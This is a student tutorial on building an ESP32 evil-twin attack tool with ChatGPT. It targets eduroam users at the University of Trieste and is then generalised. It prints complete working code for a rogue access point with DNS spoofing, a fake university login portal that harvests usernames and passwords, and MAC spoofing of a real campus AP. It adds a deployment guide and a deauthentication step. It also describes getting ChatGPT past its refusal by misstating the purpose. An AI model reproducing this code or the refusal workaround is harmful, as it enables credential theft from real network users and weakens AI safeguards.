# Developing an ESP32 EvilTwin attack tool using ChatGPT

## Preface
![Photo of Mountain](images/mountain.jpg)

With the rise of LLMs many things changed. One of those things is coding; users that previously didn't know how to code can now use natural language to prompt LLMs to generate relatively complex code. This code more often than not doesn't comply with industry standards in terms of quality/security but it is much better than what someone with basic knowledge in coding could do by himself. (Not to mention the time saved)

This Phenomenon is called **"Vibe coding"**. 

This brings us to the goal of this report: A student with general, basic knowledge in coding will bild an attack tool and (hopefully) demonstrate how chaining the use of **"exploiting" LLMs for malicious purposes** and the **"vulnerabilities" present in people**, could allow adversaries access to public or industry infrastructure with potentialy catastrophic results. 


## Introduction
The idea is to leverage the use of ChatGPT and build a generic EvilTwin attack tool. To do so we will first focus on building it for a specific purpose, in this case attacking UniTS. We willl then proceede with generalizing the code and instructions to craeate a general tool for ESP32 devices. 

We will exploit the fact that users often get random disconnections from eduroam and try to connect manually to eduroam. 
This is most noticable in areas near the diningh hall as eduroam doesn't fully cover it, or during class where professors under the pressure of time try to connect to the eduroam wifi unsuccesfully, only to give up and choose a wired connection and getting prompted to login while simultaneously blaming the university or eduroam itself for the unneccessary authentication checkup. 

It is this last experience where this idea came from. 
We will create a tool that spowns an evil AP and saves the imput from the captive portal seprately. From personal experience, no one, with the exception of experienced individals would notice it was an attacker as they would most certainly blame the university or eduroam itself for the fact that the login didn't work (if they even notice it didn't).


## DETAILED PLAN

The idea is to create a generic tool for performing evil twin attacks using the ESP32 microcontroller. To do so we will firs "exploit" a LLM (in this case ChatGPT) to get a working code that performs an evil twin attack on the University of Trieste that we will later generalize and build the necessary documentation for using the tool.

To program the ESP32 microcontroller we will use the Arduino IDE (2.3.6) as it is an easy and effective way to program the ESP32. We will also need to use the Legacy IDE (Arduino IDE 1.8.19) as we will need a tool called SPIFFS which isn't compatible with the latest versions of arduino IDE. We could use just the legycy i+IDE but the new one is faster and more powerful thus we will mostly use that one to compile and push our code to the ESP32.

As we will be "vibe coding" we need to have a clear idea of what we want to do while also taking into consideration what can be done. This is because we dont want to let the LLM lead the programming flow and thus deviating and messing up the code more than it should (hallucination effect). It works best when we have a clear goal. As stated before we also need to take into consideration what can be done: the ESP32 is a cheap microcontroller and it cannot do complex tasks. 

What we cannot do :  
+ Host large websites
+ Perform deauthentication using management frames, since eduroam seems to  use WPA3 enterprise or WPA2 enterprise (for older devices) so they probably use PMF (protected management frames) as they are mandatory in WPA3 enterprise while in WPA2 they can be toggled on or off but we will assume they are on so the ESP32 has no chance in forging those management frames.

Taking this into consideration, we will ask chatgpt to create lightweight copies of the login html pages used by the university APs. And we won't try to use deauthentication* but we will instead leverage the random disconnections and limited coverage of the eduroam network on the campus.


\* see STEP 9


Short summary of the process: 

+ Create a code that will make an AP with ssid "eduroam" on the ESP32 device
+ Make the code prompt the users to "login to use this network" by a push notification
+ Redirect to a login webpage very simmilar to the Units Eventi Wifi login page
+ Save the login data onto a separate webpage hosted on the esp32 for easy access
+ Give a "connection successful" notice to the victim
+ Generalize the code and build the documentation to create a usable tool


## PREREQUISITES
+ ESP32 microcontroller
+ Arduino IDE (Latest)
+ Arduino Legacy IDE (1.8.19)
+ Arduino ESP32 filesystem uploader plugin (```https://github.com/me-no-dev/arduino-esp32fs-plugin```)
+ LLM (ChatGPT)
+ Basic programing knowledge
+ ESP 8266


## STEP 1: Initial Setup
We need to configure Arduino IDE to work with the ESP32. We can do that by connecting the ESP32 microcontroller with the PC via usb. On the Arduino IDE under "Select board and port" we need to specify the correct port and for the board choose the DOIT ESP32 DEVKIT V1. After having thone that we will load a simple example program that will verify that we have set up everything correctly. We can do that by clicking on:

File -> Examples -> 01.Basics -> Blink

and then cliccknig the Upload button which will compile the code and upload it to the microcontroller. If everything was done right the blue LED on your device should blink every 1000ms.


## STEP 2: Code Generation
For this project I will use ChatGPT but any LLM should be fine. 
This is where we run into our first problem. As you can see from the image, when asking it directly ChatGPT isn't very keen on writing such a piece of code as it has detected it as potentialy hazardous. Fortunately for us (unfortunatley for the victims) there is a quick vay of bypassing this issue: lying.

![Direct question](images/NegativeQuestion.png)
![Response](images/ChatgptNegativeResponse.png)

  
## STEP 3: Lying To The LLM

As we saw, the LLM model is censured. We can easily fix this problem by "lying" (in this case telling the truth) to the LLM.

As you can see from the image, the LLM is happy to help now and we can proceed. 
The basic approach we will follow when talking to the LLM is the one where we don't bury it with details from the start. We want a solid base and only after we will work our way up to the details. That is why in this prompt we are not asking it to create a specific fake login website and other specific requirements that would complicate its job. We are building the foundations, brick by brick.

![Modified request](images/PositivePromptAndResponse.png)


## STEP 4: First Working Code
Now that we avoided getting censured, we can ask chatgpt to create the code. 
We proceede with many prompts trying to prompt engineere in such a vay that we get a working code while at the same time testing the provided code and trying to fix it up with the help of the LLM. 
After roughly 60 minutes we get our first working code:

```cpp
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

// AP config
const char* ssid = "eduroam";  // Open network, no password
IPAddress apIP(192, 168, 4, 1);
IPAddress netMsk(255, 255, 255, 0);

// DNS server
const byte DNS_PORT = 53;
DNSServer dnsServer;

// Web server
WebServer server(80);
String capturedData = "";

// HTML login page (based on UniTS)
const char* loginPage = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>UniTS events network - Login required</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { font-family: Arial, sans-serif; background-color: #f2f2f2; padding: 2em; }
    .container { max-width: 400px; margin: auto; background: #fff; padding: 2em; border-radius: 8px; }
    input[type=text], input[type=password] {
      width: 100%; padding: 10px; margin: 8px 0; box-sizing: border-box;
    }
    button {
      width: 100%; padding: 10px; background-color: #0056b3; color: white; border: none; border-radius: 4px;
    }
    h3, p { text-align: center; }
  </style>
</head>
<body>
  <div class="container">
    <h3>University of Trieste's EDUROAM Network</h3>
    <p>Please enter your UniTS credentials to use EDUROAM</p>
    <form action="/login" method="POST">
      <input type="text" name="username" placeholder="Username (ex. s28xxxx)" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Login</button>
    </form>
    <p style="font-size: 0.8em;">By logging in, you accept the network usage policy.</p>
  </div>
</body>
</html>
)rawliteral";

void handleRoot() {
  server.send(200, "text/html", loginPage);
}

void handleLogin() {
  String user = server.arg("username");
  String pass = server.arg("password");

  capturedData += "Username: " + user + " | Password: " + pass + "\n";
  Serial.println("[+] Captured:");
  Serial.println("User: " + user);
  Serial.println("Pass: " + pass);

  server.send(200, "text/html", "<h3>Login successful. You may now browse the internet.</h3>");
}

void handleData() {
  server.send(200, "text/plain", capturedData);
}

void handleNotFound() {
  server.sendHeader("Location", "http://192.168.4.1/", true);
  server.send(302, "text/plain", "");
}

void setup() {
  Serial.begin(115200);
  delay(1000);

  // Start open AP
  WiFi.softAPConfig(apIP, apIP, netMsk);
  WiFi.softAP(ssid);  // open AP, no password

  Serial.println("[*] Open AP 'eduroam' started");
  Serial.print("[*] IP address: ");
  Serial.println(WiFi.softAPIP());

  // DNS: resolve all domains to ESP IP
  dnsServer.start(DNS_PORT, "*", apIP);

  // Web routes
  server.on("/", handleRoot);
  server.on("/login", HTTP_POST, handleLogin);
  server.on("/data", handleData);
  server.onNotFound(handleNotFound);

  server.begin();
  Serial.println("[*] Web server started");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}
```
This code will serve as our fundation. As you can see it provides a basic html login page that we will need to update and it has a few issues like the fact that it isn't prompting to login on newer windows versions (from win10 22H2 to windows 11), but it works fine on android. 
This problems will be polished later. 


## STEP 4: Modifying The Code
Now that we have a working code it is time to analyze it and modify certain aspects that will make the attack more successful. As you can see our code provides a basic html login page that isn't very convincing, so we will fix that.

Since we are quite happy with the look of the webpage, we will keep the html code, but we need to add the UniTS logo which will make everything nicer. To do that we need to make use of SPIFFS (Serial Peripheral Interface Flash File System) on the ESP32 by using the Arduino ESP32 filesystem uploader plugin for the Legacy Arduino IDE v1.8.19 (```https://github.com/me-no-dev/arduino-esp32fs-plugin```) to upload the files to the microcontroller mamory which will then be available for the code to access when needed.

To do that we follow the guide on ```https://github.com/me-no-dev/arduino-esp32fs-plugin``` and setup the plugin. After setting it up we restart the Legacy Arduino IDE v1.8.19 and create a folder named data into our arduino project folder. The data folder is the one where we will store our index.html fake login page and other files required by index.html like logo.png.  
Having done that, we Proceede with our "vibe coding" as usual. The result can be seen in the image.

![Fake page](images/FinalWebpage.PNG)


## STEP 6: Fixing Problems
While testing, the following problems were found and fixed:

+ The image on the fake login webpage Wasn't responsive and it looked bad/fake on certain devices. To fix this we modified the image css code by adding 2 lines of code in the image css block.

```cpp
      max-width: 100%;
      height: auto;
```

+ While testing the attack we noticed that newer windows 10 versions (22H2) don't prompt the user to login automatically while older windows versions like 19H1 and 19H2 do.
After looking it up, the root cause seems to be the NCSI (Network Connectivity Status Indicator) trigger and the fact that it seems that the DNS server address needs to be set to be determined automatically on the victim device otherwise the redirection doesn't work (since if the dns server address is set manually the victim tries to contact always to the manualy set DNS server thus ignoring our one and subsequently failing the NCSI requirements and thus not redirecting us automatically to the fake login page.

  This issue was noticed using wireshark and it was fixed only after setting the dns address to "automatic" and implementing the CaptivePortal example provided by the ESP32 example library directly into our code.

+ When windows recognizes 2 APs with the same ssid they get renamed. That means that our fake eduroam AP will appear as eduroam 2 on victim's devices if they already used the real eduroam AP which is probably the case.
  This makes our attack more suspicious so to fix it we will add a character that will make it different from the original eduroam.
  Adding invisible characters like ‎‎[U+200E] seem to break the redirection on windows so we opted for a simpler approach and from:

   ```cpp
  const char* ssid = "eduroam";  // Evil Twin SSID
  ```
  
  We modify it by adding a space at the end like so:

  ```cpp
  const char* ssid = "eduroam ";  // Evil Twin SSID
  ```
  Making it look different to windows but the same to users.

  ![Before/After ssid](images/ssid.jpg)


## STEP 7: MAC spoofing
Now that we have a fully working Evil Twin AP, we can add the ability for the ESP32 to spoof MAC adresses. This allows us to use a legitimate MAC address of a real AP in the university as our MAC address. 
Spoofing the MAC address that is already known to the network, and thus to devices connected to it, enhances the stealth and credibility of the evil twin attack making it possibly more effective since it will create confusion between victim devices and thus helping us in acheeving iour goals.

We can esily obtain a legitimate MAC address by using a tool like WifiInfoView by Nirsoft while in range of the eduroam Wifi network. 

To make use of this, we need to add the following lines of code;
```cpp
uint8_t customMAC[] = { 0x9C, 0x8C, 0xD8, 0xC9, 0xCA, 0x50 }; // Replace with target MAC
esp_wifi_set_mac(WIFI_IF_AP, customMAC);
```
just before the line where our ssid is set (```WiFi.softAP(ssid);```) and afterthe line that is configuring the AP IP settings (```WiFi.softAPConfig(apIP, apIP, netMsk);```)



## STEP 8: Generalizing the code and providing a guide to use it
Now that the specific code is working we proceed by generalizing the code so it can be easily adapted for other purposes (not just eduroam) and we provide a short guide on how to use it down below.

Code:
```cpp
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SPIFFS.h>

extern "C" {
  #include "esp_wifi.h"   // API Needed to handle MAC spoofing
}

// =================== Network Configuration =======================
const char* ssid = "choose_ssid ";  // Evil Twin SSID, leave space after name to avoid windows renaming your ssid
IPAddress apIP(192, 168, 4, 1);
IPAddress netMsk(255, 255, 255, 0);

// ====================== Server Setup =============================
DNSServer dnsServer;
WebServer server(80);

String capturedData = "";

// ===================== Credential Capture Handler =====================================
void handleLogin() {
  String user = server.arg("username"); // used to capture data
  String pass = server.arg("password"); // used to capture data
  capturedData += "Username: " + user + " | Password: " + pass + "\n";

  Serial.println("[+] Captured: " + user + " | " + pass);
  server.send(200, "text/html", "<h2>Authentication successful. You may now use choose_ssid.</h2>"); //fake page that informs that everything is successful
}

// ========================== View Captured Data ===========================
void handleData() {
  server.send(200, "text/plain", capturedData);
}

// ============================= Captive Portal Handler ====================================
void handlePortal() {
  // Serve index.html from SPIFFS when redirected to /portal
  File file = SPIFFS.open("/index.html", "r"); //load and open the file from SPIFFS
  if (!file) {
    server.send(500, "text/plain", "Login page not found");
    return;
  }
  server.streamFile(file, "text/html");
  file.close(); // Close the file 
}

// ====================== HANDLE POLICY (not necessary, if login has policy can be used to redirect here) ==============================
void handlePolicy() {
  // Serve policy.html from SPIFFS when redirected to /policy
  File file = SPIFFS.open("/policy.html", "r");
  if (!file) {
    server.send(500, "text/plain", "Policy page not found");
    return;
  }
  server.streamFile(file, "text/html");
  file.close();
}

// ====================== Fallback Redirect for Unknown Requests =================================
// this will redirect unknown http req's to our captive portal page
// based on this redirect various systems could detect that WiFi AP has a captive portal page
void handleNotFound() {
  server.sendHeader("Location", "/portal", true);
  server.send(302, "text/plain", "Redirecting to captive portal");
}


void setup() {
  Serial.begin(115200);
  delay(1000);

  // ======== Wi-Fi AP Configuration ======
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, netMsk);

  // ======== Setting Spoofed MAC ==========
  uint8_t customMAC[] = { 0x9C, 0x8C, 0xD8, 0xC9, 0xCA, 0x50 }; // Replace with target MAC
  esp_wifi_set_mac(WIFI_IF_AP, customMAC);
  delay(500);

  // ======== Wi-Fi AP Configuration cont. ======
  WiFi.softAP(ssid);
  delay(500);
  Serial.println("[*] Access Point 'choose_ssid' started");
  Serial.println(WiFi.softAPIP());
  Serial.println(WiFi.softAPmacAddress());
  
  // ========== SPIFFS Mount chechk ================
  if (!SPIFFS.begin(true)) {
    Serial.println("SPIFFS Mount Failed!");
    return;
  }

  // ============== DNS Spoof All Domains ================
  if (dnsServer.start(53, "*", apIP)) {
    Serial.println("[*] DNS server started in captive mode");
  } else {
    Serial.println("[!] Failed to start DNS server");
  }

  // =================================== Routes ======================================
  server.on("/", []() {
    server.sendHeader("Location", "/portal", true);
    server.send(302, "text/plain", "");
  });

  
  server.on("/portal", handlePortal);                   // Captive portal page
  server.on("/login", HTTP_POST, handleLogin);          // Form POST
  server.on("/data", HTTP_GET, handleData);             // View captured credentials
  server.on("/policy.html", handlePolicy);                     // Policy Page
  server.serveStatic("/logo.png", SPIFFS, "/logo.png"); // Serve logo (you need to serve the file you insert into spiffs!)
  server.serveStatic("/LogoPolicy.png", SPIFFS, "/LogoPolicy.png"); // Serve Policy logo
  server.onNotFound(handleNotFound);                    // Redirect everything else

  server.begin();
  Serial.println("[*] Web server started");
}




void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}


```

**IMPORTANT NOTE**: This code is designed to be used as a test and example of what an ESP32 can do in terms of evil twin attacks. It is designed to be used on the ESP32 temporarly, in order of minutes, not for a prolonged period of time. Also, the code is not designed to handle weird imputs that could provoke injection problems. 

For this reaason the following issues need to be fixed if someone wants to use this code on an ESP32 for prolonged periods of time.

ISSUES: 
+ This code is trusting ```server.arg()``` blindly and it does not validate inputs to avoid injection issues or crashes.
+ Over time, capturedData will grow in memory. Leading to out-of-memory issues. 


### Guide: 
+ Install the Legacy Arduino IDE v1.8.19
+ Set up the Arduino ESP32 filesystem uploader plugin (```https://github.com/me-no-dev/arduino-esp32fs-plugin```)
+ Create a folder
+ Inside the folder create a .txt file and a folder called data
+ Copy the code and paste it in a txt file
+ Modify the code according to your necesities
+ Save the file and rename it to something.ino
+ Open the .ino file with the Legacy Arduino IDE
+ Under tools select Tools > ESP32 Sketch Data Upload
+ Upload the code to the ESP32




## STEP 9 (OPTIONAL): Deauthenticator
To aid the process of users connecting to our evil twin AP we will try to send deauthentication packets to disconnect the victim from the real acess point, thus increasing the probability of getting a victim to connect to our "evil" AP. 
As we easily discovered, by looking at the wifi settings on android and windows, eduraom uses WPA3 - Enterprise which poses a problem since it strictly requires PMF (Protected Management Frames) which we cannot forge as we cannot sign them. 
But we also know that sometimes eduraom falls back onto older standards like WPA2 - Enterprise for supporting older devices. Since in WPA2 - Enterprise specification PMF are optional, we can try to use the tool at ```https://deauther.com``` and an ESP8266 to send deauthentication packets to victims and hopefully boost our success rate by disconnecting users from the real AP. 

We expect that this won't do anything in terms of increasing our success rate since the PMF option is most likely turned on.














